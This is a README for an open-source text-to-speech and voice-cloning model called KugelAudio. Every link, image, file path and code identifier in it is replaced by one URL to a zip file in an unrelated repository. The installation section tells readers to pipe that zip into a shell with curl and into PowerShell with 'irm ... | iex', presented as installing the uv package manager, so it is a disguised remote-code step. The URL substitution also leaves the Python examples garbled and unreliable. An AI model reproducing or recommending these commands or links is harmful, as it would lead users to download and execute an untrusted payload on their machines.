<h1 align="center">🎙️ KugelAudio</h1>

<p align="center">
  <strong>Open-source text-to-speech for European languages with voice cloning capabilities</strong><br>
  Powered by an AR + Diffusion architecture
</p>

<p align="center">
  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip🤗-Hugging_Face_Model-blue" alt="HuggingFace Model"></a>
  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="GitHub Repository"></a>
</p>

<p align="center">
  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="License: MIT"></a>
  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip+https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="Python 3.10+"></a>
  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip🤗-Models-yellow" alt="HuggingFace"></a>
  <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip"><img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip☁️-Hosted_API-blue" alt="Hosted API"></a>
</p>

<table align="center" style="border-collapse: collapse; border: none;">
  <tr style="border: none;">
    <td style="border: none; padding: 0 20px;">
      <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip">
        <img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip%https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="KugelAudio" style="height: 60px; width: auto;">
      </a>
    </td>
    <td style="border: none; padding: 0 20px;">
      <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip">
        <img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="KI-Servicezentrum Berlin-Brandenburg" style="height: 60px; width: auto;">
      </a>
    </td>
    <td style="border: none; padding: 0 20px;">
      <a href="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip">
        <img src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" alt="Gefördert durch BMFTR" style="height: 60px; width: auto;">
      </a>
    </td>
  </tr>
</table>

---

## Motivation

**Open-source text-to-speech models for European languages are significantly lagging behind.** While English TTS has seen remarkable progress, speakers of German, French, Spanish, Polish, and dozens of other European languages have been underserved by the open-source community.

KugelAudio aims to change this. Building on the excellent foundation laid by the [VibeVoice team at Microsoft](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip), we've trained a model specifically focused on European language coverage, using approximately **200,000 hours** of highly pre-processed and enhanced speech data from the [YODAS2 dataset](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip).

## 🏆 Benchmark Results: Outperforming ElevenLabs

**KugelAudio achieves state-of-the-art performance**, beating industry leaders including ElevenLabs in rigorous human preference testing. This breakthrough demonstrates that open-source models can now rival - and surpass - the best commercial TTS systems.

### Human Preference Benchmark (A/B Testing)

We conducted extensive A/B testing with **339 human evaluations** to compare KugelAudio against leading TTS models. Participants listened to a reference voice sample, then compared outputs from two models and selected which sounded more human and closer to the original voice.

### German Language Evaluation

The evaluation specifically focused on **German language samples** with diverse emotional expressions and speaking styles:

* **Neutral Speech**: Standard conversational tones
* **Shouting**: High-intensity, elevated volume speech
* **Singing**: Melodic and rhythmic speech patterns
* **Drunken Voice**: Slurred and irregular speech characteristics

These diverse test cases demonstrate the model's capability to handle a wide range of speaking styles beyond standard narration.

### OpenSkill Ranking Results

| Rank | Model | Score | Record | Win Rate |
|------|-------|-------|--------|----------|
| 🥇 1 | **KugelAudio** | **26** | 71W / 20L / 23T | **78.0%** |
| 🥈 2 | ElevenLabs Multi v2 | 25 | 56W / 34L / 22T | 62.2% |
| 🥉 3 | ElevenLabs v3 | 21 | 64W / 34L / 16T | 65.3% |
| 4 | Cartesia | 21 | 55W / 38L / 19T | 59.1% |
| 5 | VibeVoice | 10 | 30W / 74L / 8T | 28.8% |
| 6 | CosyVoice v3 | 9 | 15W / 91L / 8T | 14.2% |

_Based on 339 evaluations using Bayesian skill-rating system (OpenSkill)_

## Audio Samples

Listen to KugelAudio's diverse voice capabilities across different speaking styles and languages:

### German Voice Samples

| Sample | Description | Audio Player |
|--------|-------------|--------------|
| **Whispering** | Soft whispering voice | <audio controls><source src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zipühttps://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" type="audio/wav"></audio> |
| **Female Narrator** | Professional female reader voice | <audio controls><source src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" type="audio/wav"></audio> |
| **Angry Voice** | Irritated and frustrated speech | <audio controls><source src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" type="audio/wav"></audio> |
| **Radio Announcer** | Professional radio broadcast voice | <audio controls><source src="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip" type="audio/wav"></audio> |

*All samples are generated with zero-shot voice cloning from reference audio.*

### Training Details

- **Base Model**: [Microsoft VibeVoice](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)
- **Training Data**: ~200,000 hours from [YODAS2](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)
- **Hardware**: 8x NVIDIA H100 GPUs
- **Training Duration**: 5 days

### Supported Languages

KugelAudio supports **24 major European languages** with varying levels of quality based on dataset representation:

| Language | Code | Flag | Language | Code | Flag | Language | Code | Flag |
|----------|------|------|----------|------|------|----------|------|------|
| English | en | 🇺🇸 | German | de | 🇩🇪 | French | fr | 🇫🇷 |
| Spanish | es | 🇪🇸 | Italian | it | 🇮🇹 | Portuguese | pt | 🇵🇹 |
| Dutch | nl | 🇳🇱 | Polish | pl | 🇵🇱 | Russian | ru | 🇷🇺 |
| Ukrainian | uk | 🇺🇦 | Czech | cs | 🇨🇿 | Romanian | ro | 🇷🇴 |
| Hungarian | hu | 🇭🇺 | Swedish | sv | 🇸🇪 | Danish | da | 🇩🇰 |
| Finnish | fi | 🇫🇮 | Norwegian | no | 🇳🇴 | Greek | el | 🇬🇷 |
| Bulgarian | bg | 🇧🇬 | Slovak | sk | 🇸🇰 | Croatian | hr | 🇭🇷 |
| Serbian | sr | 🇷🇸 | Turkish | tr | 🇹🇷 | | | |

> **📊 Language Coverage Disclaimer**: Quality varies significantly by language. Spanish, French, English, and German have the strongest representation in our training data (~200,000 hours from YODAS2). Other languages may have reduced quality, prosody, or vocabulary coverage depending on their availability in the training dataset.

## 📖 Start Here

Get started with KugelAudio quickly using our documentation:

| | |
|---|---|
| 📥 [**Installation**](#installation) | Set up KugelAudio on your machine |
| 🎯 [**Quick Start**](#quick-start) | Generate your first speech in minutes |
| 🎭 [**Voice Cloning**](#voice-cloning) | Clone any voice with reference audio |
| ☁️ [**Hosted API**](#hosted-api) | Use our cloud API for zero-setup inference |
| 🔒 [**Watermarking**](#audio-watermarking) | Verify AI-generated audio |
| 📦 [**Models**](#models) | Available model variants and benchmarks |

---

## Features

- 🏆 **State-of-the-Art Performance**: Outperforms ElevenLabs and other leading TTS models in human evaluations
- 🌍 **European Language Focus**: Trained specifically for 24 major European languages
- **High-Quality TTS**: State-of-the-art speech synthesis using AR + Diffusion
- **Voice Cloning**: Clone any voice with just a few seconds of reference audio
- **Audio Watermarking**: All generated audio is watermarked using [Facebook's AudioSeal](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)
- 🎭 **Emotional Range**: Supports various speaking styles including shouting, singing, and expressive speech
- **Web Interface**: Easy-to-use Gradio UI for non-technical users
- **HuggingFace Integration**: Seamless loading from HuggingFace Hub

## Quick Start

### Installation

#### Prerequisites

- Python 3.10 or higher
- PyTorch 2.0 or higher
- CUDA (recommended for GPU acceleration)
- [uv](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip) (recommended package manager)

#### Install uv

```bash
# macOS/Linux
curl -LsSf https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip | sh

# Windows (PowerShell)
powershell -ExecutionPolicy ByPass -c "irm https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip | iex"

# Or via pip
pip install uv
```

#### Installation

```bash
# Clone the repository
git clone https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip
cd kugelaudio-open

# Run directly with uv (recommended - handles all dependencies automatically)
uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip
```

That's it! The `uv run` command will automatically create a virtual environment and install all dependencies.

### Launch Web Interface

```bash
# Quick start with uv (recommended)
uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip

# With a public share link
uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip ui --share

# Custom host and port
uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip ui --host 0.0.0.0 --port 8080
```

Then open http://127.0.0.1:7860 in your browser.

### Command Line Usage

```bash
# Generate speech from text
uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip generate "Hello, this is KugelAudio!" -o https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip

# With voice cloning
uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip generate "Hello in your voice!" -r https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip -o https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip

# Using the default model for higher quality
uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip generate "Premium quality speech" --model kugelaudio/kugelaudio-0-open -o https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip

# Check if audio contains watermark
uv run python https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip verify https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip
```

### Python API

```python
from kugelaudio_open import (
    KugelAudioForConditionalGenerationInference,
    KugelAudioProcessor,
)
import torch

# Load model
device = "cuda" if https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip() else "cpu"
model = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(
    "kugelaudio/kugelaudio-0-open",
    https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip,
).to(device)
https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip()

processor = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip("kugelaudio/kugelaudio-0-open")

# Generate speech (watermark is automatically applied)
inputs = processor(text="Hello world!", return_tensors="pt")
inputs = {k: https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(device) if isinstance(v, https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip) else v for k, v in https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip()}

with https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip():
    outputs = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(**inputs, cfg_scale=3.0)

# Save audio
https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip[0], "https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip")
```

### Voice Cloning

```python
# Process text with voice prompt for cloning
inputs = processor(
    text="Hello world!",
    voice_prompt="https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip",  # Path to reference audio
    return_tensors="pt"
)
inputs = {k: https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(device) if isinstance(v, https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip) else v for k, v in https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip()}

# Generate with cloned voice (watermark is automatically applied)
with https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip():
    outputs = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(**inputs, cfg_scale=3.0)

https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip[0], "https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip")
```

## Hosted API

Don't want to run your own infrastructure? Use our **hosted API at [https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**:

- ⚡ **Ultra-low latency**: Inference as fast as **39ms**, end-to-end latency **<100ms** including network
- 🌍 **Global edge deployment**: Low latency worldwide
- 🔧 **Zero setup**: No GPU required, just API calls
- 📈 **Auto-scaling**: Handle any traffic volume

### Python SDK

```bash
uv pip install kugelaudio
```

```python
from kugelaudio import KugelAudio

# Initialize the client
client = KugelAudio(api_key="your_api_key")

# Generate speech
audio = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(
    text="Hello from KugelAudio!",
    model="kugel-1-turbo",
)

# Save to file
https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip("https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip")
print(f"Generated {https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip}s in {https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip}ms")
```


📚 [Full SDK Documentation →](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)

## Audio Watermarking

All audio generated by KugelAudio contains an imperceptible watermark using [Facebook's AudioSeal](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip) technology. This helps identify AI-generated content and prevent misuse.

### Verify Watermark

```python
from https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip import AudioWatermark

watermark = AudioWatermark()

# Check if audio is watermarked
result = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(audio, sample_rate=24000)

print(f"Detected: {https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip}")
print(f"Confidence: {https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip%}")
```

### Watermark Features

- **Imperceptible**: No audible difference in audio quality
- **Robust**: Survives compression, resampling, and editing
- **Fast Detection**: Real-time capable detection
- **Sample-Level**: 1/16k second resolution

## Models

| Model | Parameters | Quality | RTF | Speed | VRAM |
|-------|------------|---------|-----|-------|------|
| [kugelaudio-0-open](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip) | 7B | Best | 1.00 | 1.0x realtime | ~19GB |

*RTF = Real-Time Factor (generation time / audio duration). Lower is faster.*
## Architecture

KugelAudio uses a hybrid AR + Diffusion architecture:

1. **Text Encoder**: Qwen2-based language model encodes input text
2. **TTS Backbone**: Upper transformer layers generate speech representations
3. **Diffusion Head**: Predicts speech latents using denoising diffusion
4. **Acoustic Decoder**: Converts latents to audio waveforms

## Configuration

### Environment Variables

```bash
# Use specific GPU
export CUDA_VISIBLE_DEVICES=0

# Enable TF32 for faster computation on Ampere GPUs
export TORCH_ALLOW_TF32=1
```

### Advanced Generation Parameters

```python
outputs = https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip(
    **inputs,
    voice_prompt=voice_prompt,      # Reference audio for voice cloning
    cfg_scale=3.0,                  # Guidance scale (1.0-10.0)
    max_new_tokens=4096,            # Maximum generation length
)
```

## Responsible Use

This technology is intended for legitimate purposes:

✅ **Appropriate Uses:**
- Accessibility (TTS for visually impaired)
- Content creation (podcasts, videos, audiobooks)
- Voice assistants and chatbots
- Language learning applications
- Creative projects with consent

❌ **Prohibited Uses:**
- Creating deepfakes or misleading content
- Impersonating individuals without consent
- Fraud or deception
- Any illegal activities

All generated audio is watermarked to enable detection of AI-generated content.

## License

MIT License - see [LICENSE](LICENSE) for details.

## Acknowledgments

This model would not have been possible without the contributions of many individuals and organizations:

- **[Microsoft VibeVoice Team](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**: For the excellent foundation architecture that this model builds upon
- **[YODAS2 Dataset](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**: For providing the large-scale multilingual speech data
- **[Qwen Team](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**: For the powerful language model backbone
- **[Facebook AudioSeal](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**: For the audio watermarking technology
- **[HuggingFace](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)**: For model hosting and the transformers library

### Special Thanks

- **Carlos Menke**: For his invaluable efforts in gathering the first datasets and extensive work benchmarking the model
- **AI Service Center Berlin-Brandenburg (KI-Servicezentrum)**: For providing the GPU resources (8x H100) that made training this model possible





## Authors

**Kajo Kratzenstein**  
📧 [https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)  
🌐 [https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip](https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip)

**Carlos Menke**

## Citation

```bibtex
@software{kugelaudio2026,
  title = {KugelAudio: Open-Source Text-to-Speech for European Languages with Voice Cloning},
  author = {Kratzenstein, Kajo and Menke, Carlos},
  year = {2026},
  institution = {Hasso-Plattner-Institut},
  url = {https://raw.githubusercontent.com/hotmysia/kugelaudio-open_moja_kopia/main/examples/open-moja-kugelaudio-kopia-v1.0.zip}
}
```


---

<p align="center">
  <strong>Funding Notice</strong>
</p>

<p align="center">
  Das zugrunde liegende Vorhaben wurde mit Mitteln des Bundesministeriums für Forschung, Technologie und Raumfahrt unter dem Förderkennzeichen »KI-Servicezentrum Berlin-Brandenburg« 16IS22092 gefördert. Die Verantwortung für den Inhalt dieser Seite liegt bei der Autorin/beim Autor.
</p>

<p align="center">
  <em>This project was funded by the German Federal Ministry of Research, Technology and Space under the funding code "AI Service Center Berlin-Brandenburg" 16IS22092. The responsibility for the content of this publication lies with the author.</em>
</p>

---
